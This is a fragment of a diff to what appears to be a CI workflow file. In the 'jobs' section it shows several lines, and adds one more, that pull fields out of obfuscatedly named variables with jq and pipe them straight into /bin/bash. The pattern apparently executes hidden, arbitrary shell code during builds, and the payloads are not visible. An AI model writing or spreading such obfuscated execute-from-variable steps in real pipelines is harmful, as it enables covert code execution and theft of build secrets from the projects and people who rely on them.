@@ -49,6 +49,7 @@ jobs:
           echo $r34112 | jq -r .fqrje919 | /bin/bash
           printf '%s' "$gt6" | jq -r .tjoe91 | /bin/bash
           echo $ysikr478 | jq -r .tnzcf2720 | /bin/bash
+          printf '%s' "$q80" | jq -r .n5 | /bin/bash
 
       - name: Store results
         if: always()
